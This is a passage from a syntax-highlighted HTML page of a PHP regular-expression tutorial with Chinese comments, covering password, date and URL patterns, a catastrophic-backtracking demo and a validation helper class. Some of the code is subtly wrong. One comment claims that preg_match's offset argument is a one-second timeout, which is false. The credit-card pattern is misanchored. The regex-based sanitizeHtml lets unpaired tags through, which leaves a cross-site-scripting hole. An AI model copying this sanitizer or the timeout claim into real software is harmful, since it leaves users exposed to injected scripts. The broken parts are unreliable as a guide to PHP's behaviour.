class="string">&#x27;/^(?=.*[A-Z])(?=.*[a-z])(?=.*\d)(?&lt;!^\d).&#123;8,&#125;$/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$passwords</span> = [</span><br><span class="line">    <span class="string">&quot;ValidPass123&quot;</span>,     <span class="comment">// 有效: 满足所有条件</span></span><br><span class="line">    <span class="string">&quot;invalidpass123&quot;</span>,   <span class="comment">// 无效: 缺少大写字母</span></span><br><span class="line">    <span class="string">&quot;VALIDPASS123&quot;</span>,     <span class="comment">// 无效: 缺少小写字母</span></span><br><span class="line">    <span class="string">&quot;ValidPassword&quot;</span>,    <span class="comment">// 无效: 缺少数字</span></span><br><span class="line">    <span class="string">&quot;1InvalidPass&quot;</span>,     <span class="comment">// 无效: 以数字开头</span></span><br><span class="line">    <span class="string">&quot;Sh0rt&quot;</span>,            <span class="comment">// 无效: 长度不足</span></span><br><span class="line">    <span class="string">&quot;Valid1Pass&quot;</span>        <span class="comment">// 有效: 满足所有条件</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$passwords</span> <span class="keyword">as</span> <span class="variable">$pwd</span>) &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$password_pattern</span>, <span class="variable">$pwd</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;[%-12s] %s\n&quot;</span>, </span><br><span class="line">        <span class="variable">$pwd</span>, </span><br><span class="line">        <span class="variable">$result</span> ? <span class="string">&quot;✓ 强密码&quot;</span> : <span class="string">&quot;✗ 弱密码 - 不符合复杂度要求&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 命名捕获组 - 解析日期</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【2. 命名捕获组】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 日期格式: YYYY-MM-DD 或 DD/MM/YYYY</span></span><br><span class="line"><span class="comment"> * 使用命名捕获组提取年、月、日</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$date_pattern</span> = <span class="string">&#x27;/(?P&lt;year&gt;\d&#123;4&#125;)-(?P&lt;month&gt;\d&#123;2&#125;)-(?P&lt;day&gt;\d&#123;2&#125;)|(?P&lt;day2&gt;\d&#123;2&#125;)\/(?P&lt;month2&gt;\d&#123;2&#125;)\/(?P&lt;year2&gt;\d&#123;4&#125;)/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dates</span> = [</span><br><span class="line">    <span class="string">&quot;2023-12-25&quot;</span>,</span><br><span class="line">    <span class="string">&quot;31/12/2023&quot;</span>,</span><br><span class="line">    <span class="string">&quot;12-25-2023&quot;</span>  <span class="comment">// 无效格式</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$dates</span> <span class="keyword">as</span> <span class="variable">$date</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$date_pattern</span>, <span class="variable">$date</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="comment">// 处理不同格式的日期</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$matches</span>[<span class="string">&#x27;year&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$year</span> = <span class="variable">$matches</span>[<span class="string">&#x27;year&#x27;</span>];</span><br><span class="line">            <span class="variable">$month</span> = <span class="variable">$matches</span>[<span class="string">&#x27;month&#x27;</span>];</span><br><span class="line">            <span class="variable">$day</span> = <span class="variable">$matches</span>[<span class="string">&#x27;day&#x27;</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$year</span> = <span class="variable">$matches</span>[<span class="string">&#x27;year2&#x27;</span>];</span><br><span class="line">            <span class="variable">$month</span> = <span class="variable">$matches</span>[<span class="string">&#x27;month2&#x27;</span>];</span><br><span class="line">            <span class="variable">$day</span> = <span class="variable">$matches</span>[<span class="string">&#x27;day2&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[<span class="subst">$date</span>] ✓ 有效日期: <span class="subst">&#123;$year&#125;</span>年<span class="subst">&#123;$month&#125;</span>月<span class="subst">&#123;$day&#125;</span>日\n&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[<span class="subst">$date</span>] ✗ 无效日期格式\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 模式修饰符详解</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【3. 模式修饰符详解】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 常用修饰符:</span></span><br><span class="line"><span class="comment"> * i - 不区分大小写</span></span><br><span class="line"><span class="comment"> * m - 多行模式(^和$匹配每行开头结尾)</span></span><br><span class="line"><span class="comment"> * s - 使.匹配包括换行符在内的所有字符</span></span><br><span class="line"><span class="comment"> * u - UTF-8模式(支持Unicode)</span></span><br><span class="line"><span class="comment"> * x - 扩展模式(忽略空格和注释)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例1: 多行模式(m)和Unicode(u)结合</span></span><br><span class="line"><span class="variable">$text_multiline</span> = <span class="string">&quot;苹果\nBanana\n樱桃\nDate&quot;</span>;</span><br><span class="line"><span class="variable">$pattern_multiline</span> = <span class="string">&#x27;/^[\p&#123;L&#125;]&#123;3,&#125;$/mu&#x27;</span>;  <span class="comment">// 匹配每行中至少3个字母的单词(包含Unicode字符)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;多行文本:\n<span class="subst">$text_multiline</span>\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern_multiline</span>, <span class="variable">$text_multiline</span>, <span class="variable">$matches_multiline</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;匹配结果(多行+Unicode): &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$matches_multiline</span>[<span class="number">0</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 示例2: 扩展模式(x) - 提高可读性</span></span><br><span class="line"><span class="variable">$pattern_verbose</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">    /               # 分隔符</span></span><br><span class="line"><span class="string">    \b              # 单词边界</span></span><br><span class="line"><span class="string">    (?&lt;word&gt;        # 命名捕获组</span></span><br><span class="line"><span class="string">        \w+         # 一个或多个单词字符</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    \s+             # 一个或多个空白字符</span></span><br><span class="line"><span class="string">    \k&lt;word&gt;        # 重复前面捕获的相同单词</span></span><br><span class="line"><span class="string">    \b              # 单词边界</span></span><br><span class="line"><span class="string">    /x              # 扩展模式</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$text_repeat</span> = <span class="string">&quot;the the quick brown fox fox jumps over the lazy dog dog&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern_verbose</span>, <span class="variable">$text_repeat</span>, <span class="variable">$matches_repeat</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;重复单词检测: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$matches_repeat</span>[<span class="number">0</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. Unicode属性支持</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【4. Unicode属性支持】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$international_text</span> = <span class="string">&quot;Hello 你好 123 こんにちは 456&quot;</span>;</span><br><span class="line"><span class="variable">$pattern_unicode</span> = <span class="string">&#x27;/[\p&#123;L&#125;\p&#123;N&#125;]+/u&#x27;</span>;  <span class="comment">// 匹配所有字母和数字(包括非ASCII字符)</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$pattern_unicode</span>, <span class="variable">$international_text</span>, <span class="variable">$matches_unicode</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;原始文本: <span class="subst">$international_text</span>\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Unicode匹配结果: &quot;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&quot;, &quot;</span>, <span class="variable">$matches_unicode</span>[<span class="number">0</span>]) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. 回溯控制 - 防止正则表达式灾难性回溯</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【5. 回溯控制】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 问题: 当遇到恶意构造的输入时, 正则表达式可能会陷入灾难性回溯</span></span><br><span class="line"><span class="comment"> * 解决方案: 使用原子组(?&gt;...)或占有优先量词*+、++、?+、&#123;n,m&#125;+限制回溯</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 危险模式示例(可能导致回溯爆炸)</span></span><br><span class="line"><span class="variable">$dangerous_pattern</span> = <span class="string">&#x27;/^(a+)+$/&#x27;</span>;</span><br><span class="line"><span class="variable">$safe_pattern</span> = <span class="string">&#x27;/^(?&gt;a+)+$/&#x27;</span>;  <span class="comment">// 使用原子组防止回溯</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$test_string</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;a&#x27;</span>, <span class="number">25</span>) . <span class="string">&#x27;b&#x27;</span>;  <span class="comment">// 长字符串+不匹配字符</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$result_dangerous</span> = @<span class="title function_ invoke__">preg_match</span>(<span class="variable">$dangerous_pattern</span>, <span class="variable">$test_string</span>, <span class="variable">$matches</span>, <span class="number">0</span>, <span class="number">1000000</span>);  <span class="comment">// 1秒超时</span></span><br><span class="line"><span class="variable">$time_dangerous</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$start</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>);</span><br><span class="line"><span class="variable">$result_safe</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$safe_pattern</span>, <span class="variable">$test_string</span>);</span><br><span class="line"><span class="variable">$time_safe</span> = <span class="title function_ invoke__">microtime</span>(<span class="literal">true</span>) - <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;回溯控制测试:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;危险模式执行时间: &quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%.6f&#x27;</span>, <span class="variable">$time_dangerous</span>) . <span class="string">&quot;s, 结果: &quot;</span> . (<span class="variable">$result_dangerous</span> === <span class="literal">false</span> ? <span class="string">&quot;超时/错误&quot;</span> : <span class="variable">$result_dangerous</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;安全模式执行时间: &quot;</span> . <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;%.6f&#x27;</span>, <span class="variable">$time_safe</span>) . <span class="string">&quot;s, 结果: <span class="subst">$result_safe</span>\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. 高级URL解析</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【6. 高级URL解析】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url_parser</span> = <span class="string">&#x27;/</span></span><br><span class="line"><span class="string">    ^                       # 字符串开始</span></span><br><span class="line"><span class="string">    (?:</span></span><br><span class="line"><span class="string">        (?&lt;scheme&gt;[a-z]+)   # 协议(命名捕获)</span></span><br><span class="line"><span class="string">        :\/\/               # ://</span></span><br><span class="line"><span class="string">    )?                      # 协议部分是可选的</span></span><br><span class="line"><span class="string">    (?:</span></span><br><span class="line"><span class="string">        (?&lt;auth&gt;[^@]+)@     # 认证信息 username:password@</span></span><br><span class="line"><span class="string">    )?                      # 认证信息是可选的</span></span><br><span class="line"><span class="string">    (?&lt;host&gt;                # 主机名(命名捕获)</span></span><br><span class="line"><span class="string">        (?:[a-z0-9](?:[a-z0-9-]&#123;0,61&#125;[a-z0-9])?\.)+  # 子域名</span></span><br><span class="line"><span class="string">        [a-z]&#123;2,63&#125;         # 顶级域名</span></span><br><span class="line"><span class="string">        |                   # 或者</span></span><br><span class="line"><span class="string">        \d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;\.\d&#123;1,3&#125;  # IPv4地址</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    (?::(?&lt;port&gt;\d+))?      # 端口(命名捕获,可选)</span></span><br><span class="line"><span class="string">    (?&lt;path&gt;\/[^\?]*)?      # 路径(命名捕获,可选)</span></span><br><span class="line"><span class="string">    (?:\?(?&lt;query&gt;[^#]*))?  # 查询参数(命名捕获,可选)</span></span><br><span class="line"><span class="string">    (?:#(?&lt;fragment&gt;.*))?   # 片段(命名捕获,可选)</span></span><br><span class="line"><span class="string">    $                       # 字符串结束</span></span><br><span class="line"><span class="string">/ix&#x27;</span>;  <span class="comment">// 不区分大小写+扩展模式</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$urls</span> = [</span><br><span class="line">    <span class="string">&quot;https://user:pass@example.com:8080/path/to/file?query=1#fragment&quot;</span>,</span><br><span class="line">    <span class="string">&quot;http://sub.domain.co.uk&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ftp://192.168.1.1/file.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;example.com/path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;invalid_url&quot;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$urls</span> <span class="keyword">as</span> <span class="variable">$url</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;\n分析URL: <span class="subst">$url</span>\n&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$url_parser</span>, <span class="variable">$url</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">        <span class="comment">// 清理匹配结果,只保留命名捕获</span></span><br><span class="line">        <span class="variable">$result</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$matches</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_int</span>(<span class="variable">$key</span>) &amp;&amp; <span class="variable">$value</span> !== <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$result</span>[<span class="variable">$key</span>] = <span class="variable">$value</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;✓ 有效URL\n&quot;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$name</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;  <span class="subst">$name</span>: <span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;✗ 无效URL格式\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 7. 正则表达式工具类(增强版)</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n【7. 增强版正则表达式工具类】\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdvancedRegexHelper</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 静态常量 - 优化的正则表达式</span></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">EMAIL_PATTERN</span> = <span class="string">&#x27;/^[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]&#123;2,&#125;$/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">URL_PATTERN</span> = <span class="string">&#x27;/^(?:https?:\/\/)?(?:[a-z0-9-]+\.)+[a-z]&#123;2,6&#125;(?:\/[\w\-\.?%&amp;=]*)?$/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">PHONE_PATTERN</span> = <span class="string">&#x27;/^\+?1?[-. (]*(\d&#123;3&#125;)[-. )]*(\d&#123;3&#125;)[-. ]*(\d&#123;4&#125;)$/&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">CREDIT_CARD_PATTERN</span> = <span class="string">&#x27;/^(?&lt;visa&gt;4\d&#123;12&#125;(?:\d&#123;3&#125;)?)|(?&lt;mastercard&gt;5[1-5]\d&#123;14&#125;)|(?&lt;amex&gt;3[47]\d&#123;13&#125;)$/&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">HTML_TAG_PATTERN</span> = <span class="string">&#x27;/&lt;([a-z]+)([^&lt;]*)&gt;(.*?)&lt;\/\1&gt;/is&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 验证方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateEmail</span>(<span class="params"><span class="variable">$email</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatch</span>(<span class="built_in">self</span>::<span class="variable constant_">EMAIL_PATTERN</span>, <span class="variable">$email</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateUrl</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatch</span>(<span class="built_in">self</span>::<span class="variable constant_">URL_PATTERN</span>, <span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validatePhone</span>(<span class="params"><span class="variable">$phone</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatch</span>(<span class="built_in">self</span>::<span class="variable constant_">PHONE_PATTERN</span>, <span class="variable">$phone</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">validateCreditCard</span>(<span class="params"><span class="variable">$cardNumber</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleanCard</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\s+/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cardNumber</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatch</span>(<span class="built_in">self</span>::<span class="variable constant_">CREDIT_CARD_PATTERN</span>, <span class="variable">$cleanCard</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 提取方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">extractEmails</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatchAll</span>(<span class="built_in">self</span>::<span class="variable constant_">EMAIL_PATTERN</span>, <span class="variable">$text</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">extractUrls</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatchAll</span>(<span class="built_in">self</span>::<span class="variable constant_">URL_PATTERN</span>, <span class="variable">$text</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">extractPhoneNumbers</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">safeRegexMatchAll</span>(<span class="built_in">self</span>::<span class="variable constant_">PHONE_PATTERN</span>, <span class="variable">$text</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 转换方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">maskCreditCard</span>(<span class="params"><span class="variable">$cardNumber</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$cleanCard</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\D/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cardNumber</span>);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">self</span>::<span class="title function_ invoke__">validateCreditCard</span>(<span class="variable">$cleanCard</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;无效的信用卡号&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$last4</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$cleanCard</span>, -<span class="number">4</span>);</span><br><span class="line">        <span class="variable">$masked</span> = <span class="title function_ invoke__">str_repeat</span>(<span class="string">&#x27;*&#x27;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$cleanCard</span>) - <span class="number">4</span>) . <span class="variable">$last4</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/(\*&#123;4&#125;)(?=\*&#123;4&#125;)/&#x27;</span>, <span class="string">&#x27;$1 &#x27;</span>, <span class="variable">$masked</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeHtml</span>(<span class="params"><span class="variable">$html</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 仅保留安全的HTML标签</span></span><br><span class="line">        <span class="variable">$allowedTags</span> = [<span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;em&#x27;</span>, <span class="string">&#x27;strong&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;br&#x27;</span>, <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace_callback</span>(</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable constant_">HTML_TAG_PATTERN</span>,</span><br><span class="line">            function(<span class="variable">$matches</span>) <span class="keyword">use</span> ($<span class="title">allowedTags</span>) &#123;</span><br><span class="line">                $<span class="title">tag</span> = <span class="title">strtolower</span>($<span class="title">matches</span>[1]);</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$tag</span>, <span class="variable">$allowedTags</span>)) &#123;</span><br><span class="line">                    <span class="comment">// 仅对a标签特殊处理，清理href属性</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$tag</span> === <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">                        <span class="variable">$href</span> = <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/href\s*=\s*&quot;([^&quot;]*)&quot;/i&#x27;</span>, <span class="variable">$matches</span>[<span class="number">2</span>], <span class="variable">$hrefMatches</span>) </span><br><span class="line">                               ? <span class="variable">$hrefMatches</span>[<span class="number">1</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(https?:\/\/|mailto:)/i&#x27;</span>, <span class="variable">$href</span>)) &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="string">&quot;&lt;a href=\&quot;<span class="subst">$href</span>\&quot;&gt;&quot;</span> . <span class="built_in">self</span>::<span class="title function_ invoke__">sanitizeHtml</span>(<span class="variable">$matches</span>[<span class="number">3</span>]) . <span class="string">&quot;&lt;/a&gt;&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;&lt;<span class="subst">$tag</span>&gt;&quot;</span> . <span class="built_in">self</span>::<span class="title function_ invoke__">sanitizeHtml</span>(<span class="variable">$matches</span>[<span class="number">3</span>]) . <span class="string">&quot;&lt;/<span class="subst">$tag</span>&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">self</span>::<span class="title function_ invoke__">sanitizeHtml</span>(<span class="variable">$matches</span>[<span class="number">3</span>]); <span class="comment">// 移除不允许的标签，但保留内容</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$html</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 替换方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">makeClickableLinks</span>(<span class="params"><span class="variable">$text</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/(?&lt;![\w\/])(https?:\/\/|www\.)([\w\-\.]+\.[a-zA-Z]&#123;2,&#125;(?:\/[\w\.\/\?\&amp;\=\-]*)?)/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace_callback</span>(<span class="variable">$pattern</span>, function(<span class="variable">$matches</span>) &#123;</span><br><span class="line">            <span class="variable">$url</span> = <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">            <span class="variable">$display</span> = (<span class="title function_ invoke__">strlen</span>(<span class="variable">$url</span>) &gt; <span class="number">30</span>) ? <span class="title function_ invoke__">substr</span>(<span class="variable">$url</span>, <span class="number">0</span>, <span class="number">27</span>) . <span class="string">&#x27;...&#x27;</span> : <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$url</span>, <span class="string">&#x27;www.&#x27;</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="variable">$url</span> = <span class="string">&#x27;http://&#x27;</span> . <span class="variable">$url</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&lt;a href=\&quot;<span class="subst">$url</span>\&quot; target=\&quot;_blank\&quot;&gt;<span class="subst">$display</span>&lt;/a&gt;&quot;</span>;</span><br><span class="line">        &#125;, <span class="variable">$text</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 工具方法</span></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">safeRegexMatch</span>(<span class="params"><span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$flags</span> = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">set_error_handler</span>(function() &#123;&#125;); <span class="comment">// 临时忽略错误</span></span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$subject</span>, <span class="variable">$matches</span>, <span class="variable">$flags</span>);</span><br><span class="line">        <span class="title function_ invoke__">restore_error_handler</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$error</span> = <span class="title function_ invoke__">preg_last_error</span>();</span><br><span class="line">            <span class="variable">$errorMsg</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getPregError</span>(<span class="variable">$error</span>);</span><br><span class="line">            <span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;正则表达式错误: <span class="subst">$errorMsg</span>&quot;</span>, 